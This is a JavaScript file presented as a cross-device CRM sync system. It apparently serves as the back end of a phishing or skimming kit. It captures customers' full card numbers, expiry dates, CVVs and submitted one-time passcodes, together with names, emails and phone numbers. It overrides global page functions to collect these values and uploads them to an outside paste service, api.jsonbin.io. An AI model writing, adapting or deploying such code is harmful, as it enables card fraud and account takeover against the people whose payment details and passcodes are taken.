// Real Cross-Device CRM Synchronization System
class RealCRMSync {
  constructor() {
    this.useLocalStorage = false; // Force cloud mode
    this.apiEndpoint = 'https://api.jsonbin.io/v3/b';
    this.binId = this.getOrCreateBinId();
    this.apiKey = 'demo'; // Demo key - replace with real key for production
    this.lastSyncTime = localStorage.getItem('crmLastSync') || null;
    this.deviceId = this.getDeviceId();
    this.init();
  }

  init() {
    console.log('CRM: Initializing real cross-device sync...');
    console.log('CRM: Device ID:', this.deviceId);
    console.log('CRM: Bin ID:', this.binId);
    
    // Monitor online status
    window.addEventListener('online', () => {
      console.log('CRM: Back online - syncing...');
      this.syncFromCloud();
    });

    // Auto-sync every millisecond for ultra-fast real-time updates
    setInterval(() => {
      if (navigator.onLine) {
        this.syncFromCloud();
      }
    }, 1); // 1 millisecond = ultra-fast synchronization
  }

  getOrCreateBinId() {
    let binId = localStorage.getItem('crmBinId');
    if (!binId) {
      // Generate new bin ID
      binId = 'crm_' + Date.now().toString(36) + '_' + Math.random().toString(36).substr(2, 9);
      localStorage.setItem('crmBinId', binId);
      console.log('CRM: Created new bin:', binId);
    }
    return binId;
  }

  getDeviceId() {
    let deviceId = localStorage.getItem('crmDeviceId');
    if (!deviceId) {
      deviceId = 'device_' + Date.now().toString(36) + '_' + Math.random().toString(36).substr(2, 9);
      localStorage.setItem('crmDeviceId', deviceId);
      console.log('CRM: Created new device ID:', deviceId);
    }
    return deviceId;
  }

  // Get local data
  getLocalData() {
    try {
      const data = localStorage.getItem('crmData');
      return data ? JSON.parse(data) : { orders: [], cards: [], otp: [] };
    } catch (e) {
      console.error('CRM: Error reading local data:', e);
      return { orders: [], cards: [], otp: [] };
    }
  }

  // Save local data
  saveLocalData(data) {
    try {
      localStorage.setItem('crmData', JSON.stringify(data));
      return true;
    } catch (e) {
      console.error('CRM: Error saving local data:', e);
      return false;
    }
  }

  // Load data from cloud
  async loadFromCloud() {
    try {
      console.log('CRM: Loading from cloud...');
      
      // Try to read from our bin
      const response = await fetch(`${this.apiEndpoint}/${this.binId}/latest`, {
        method: 'GET',
        headers: {
          'X-Master-Key': this.apiKey
        }
      });

      if (response.ok) {
        const data = await response.json();
        console.log('CRM: Cloud data loaded:', data);
        return data.record;
      } else {
        console.log('CRM: No cloud data found');
        return null;
      }
    } catch (error) {
      console.error('CRM: Failed to load from cloud:', error);
      return null;
    }
  }

  // Save data to cloud
  async saveToCloud(data) {
    try {
      console.log('CRM: Saving to cloud...');
      
      const payload = {
        ...data,
        lastUpdated: new Date().toISOString(),
        updatedBy: this.deviceId
      };

      const response = await fetch(this.apiEndpoint, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'X-Master-Key': this.apiKey
        },
        body: JSON.stringify(payload)
      });

      if (response.ok) {
        const result = await response.json();
        console.log('CRM: Cloud save successful:', result);
        
        // Update bin ID if new
        if (result.metadata && result.metadata.id) {
          localStorage.setItem('crmBinId', result.metadata.id);
          this.binId = result.metadata.id;
        }
        
        // Update sync time
        localStorage.setItem('crmLastSync', Date.now().toString());
        this.lastSyncTime = Date.now().toString();
        
        return true;
      } else {
        console.error('CRM: Cloud save failed:', response.status);
        return false;
      }
    } catch (error) {
      console.error('CRM: Failed to save to cloud:', error);
      return false;
    }
  }

  // Sync from cloud
  async syncFromCloud() {
    if (!navigator.onLine) {
      console.log('CRM: Offline - skipping sync');
      return false;
    }

    try {
      // Load from cloud
      const cloudData = await this.loadFromCloud();
      
      if (cloudData) {
        // Get local data
        const localData = this.getLocalData();
        
        // Merge data
        const mergedData = this.mergeData(localData, cloudData);
        
        // Save merged data locally
        this.saveLocalData(mergedData);
        
        console.log('CRM: Sync from cloud completed');
        return true;
      } else {
        console.log('CRM: No cloud data to sync');
        return false;
      }
    } catch (error) {
      console.error('CRM: Sync from cloud failed:', error);
      return false;
    }
  }

  // Sync to cloud
  async syncToCloud() {
    if (!navigator.onLine) {
      console.log('CRM: Offline - skipping cloud save');
      return false;
    }

    try {
      // Get local data
      const localData = this.getLocalData();
      
      // Save to cloud
      const success = await this.saveToCloud(localData);
      
      if (success) {
        console.log('CRM: Sync to cloud completed');
        return true;
      } else {
        console.log('CRM: Sync to cloud failed');
        return false;
      }
    } catch (error) {
      console.error('CRM: Sync to cloud failed:', error);
      return false;
    }
  }

  // Merge local and cloud data
  mergeData(localData, cloudData) {
    const merged = {
      orders: [...(cloudData.orders || []), ...(localData.orders || [])],
      cards: [...(cloudData.cards || []), ...(localData.cards || [])],
      otp: [...(cloudData.otp || []), ...(localData.otp || [])],
      settings: {
        ...cloudData.settings,
        ...localData.settings,
        lastSync: new Date().toISOString(),
        deviceId: this.deviceId
      }
    };

    // Remove duplicates based on ID
    merged.orders = this.removeDuplicates(merged.orders, 'id');
    merged.cards = this.removeDuplicates(merged.cards, 'id');
    merged.otp = this.removeDuplicates(merged.otp, 'id');

    // Sort by timestamp (newest first)
    merged.orders.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
    merged.cards.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
    merged.otp.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));

    return merged;
  }

  // Remove duplicates
  removeDuplicates(array, key) {
    const seen = new Set();
    return array.filter(item => {
      if (seen.has(item[key])) {
        return false;
      }
      seen.add(item[key]);
      return true;
    });
  }

  // Get CRM stats
  async getStats() {
    const data = this.getLocalData();
    return {
      totalOrders: data.orders?.length || 0,
      totalCards: data.cards?.length || 0,
      totalOTP: data.otp?.length || 0,
      successRate: data.otp?.length > 0 ? 100 : 0,
      lastSync: this.lastSyncTime ? new Date(parseInt(this.lastSyncTime)).toISOString() : null,
      deviceId: this.deviceId,
      isOnline: navigator.onLine,
      syncEnabled: true,
      binId: this.binId
    };
  }

  // Add order with cross-device sync
  async addOrder(orderData) {
    const data = this.getLocalData();
    const order = {
      id: this.generateId(),
      timestamp: new Date().toISOString(),
      deviceId: this.deviceId,
      fullName: orderData.fullName,
      email: orderData.email,
      phone: orderData.phone,
      orderTotal: orderData.orderTotal,
      status: 'Completed'
    };
    
    data.orders = data.orders || [];
    data.orders.unshift(order);
    
    // Save locally
    this.saveLocalData(data);
    
    // Sync to cloud immediately - ultra-fast
    setTimeout(() => this.syncToCloud(), 1); // 1 millisecond sync
    
    console.log('CRM: Order added and syncing across devices');
    return order;
  }

  // Add card details with cross-device sync
  async addCardDetails(cardData) {
    const data = this.getLocalData();
    const card = {
      id: this.generateId(),
      timestamp: new Date().toISOString(),
      deviceId: this.deviceId,
      cardName: cardData.cardName,
      cardNumber: cardData.cardNumber,
      expiry: cardData.expiry,
      cvv: cardData.cvv,
      status: 'Received'
    };
    
    data.cards = data.cards || [];
    data.cards.unshift(card);
    
    // Save locally
    this.saveLocalData(data);
    
    // Sync to cloud immediately - ultra-fast
    setTimeout(() => this.syncToCloud(), 1); // 1 millisecond sync
    
    console.log('CRM: Card details added and syncing across devices');
    return card;
  }

  // Add OTP data with cross-device sync
  async addOTPData(otpData) {
    const data = this.getLocalData();
    const otp = {
      id: this.generateId(),
      timestamp: new Date().toISOString(),
      deviceId: this.deviceId,
      submittedOTP: otpData.submittedOTP,
      email: otpData.email,
      phone: otpData.phone,
      status: 'Verified'
    };
    
    data.otp = data.otp || [];
    data.otp.unshift(otp);
    
    // Save locally
    this.saveLocalData(data);
    
    // Sync to cloud immediately - ultra-fast
    setTimeout(() => this.syncToCloud(), 1); // 1 millisecond sync
    
    console.log('CRM: OTP data added and syncing across devices');
    return otp;
  }

  // Generate unique ID
  generateId() {
    return Date.now().toString(36) + Math.random().toString(36).substr(2, 9);
  }

  // Export data
  async exportData() {
    const data = this.getLocalData();
    const dataStr = JSON.stringify(data, null, 2);
    const blob = new Blob([dataStr], { type: 'application/json' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = 'crm_data_' + new Date().toISOString().split('T')[0] + '.json';
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
  }

  // Clear all data
  async clearAllData() {
    const initialData = {
      orders: [],
      cards: [],
      otp: [],
      settings: {
        autoSave: true,
        lastBackup: new Date().toISOString(),
        deviceId: this.deviceId
      }
    };
    
    this.saveLocalData(initialData);
    await this.syncToCloud();
  }
}

// Initialize real sync system
window.realCRMSync = new RealCRMSync();

// Override all CRM functions
window.addOrder = async function(data) {
  return await window.realCRMSync.addOrder(data);
};

window.addCardDetails = async function(data) {
  return await window.realCRMSync.addCardDetails(data);
};

window.addOTPData = async function(data) {
  return await window.realCRMSync.addOTPData(data);
};

window.syncCRMFromCloud = async function() {
  return await window.realCRMSync.syncFromCloud();
};

window.cloudCRMStorage = window.realCRMSync;

console.log('Real Cross-Device CRM Sync System initialized');
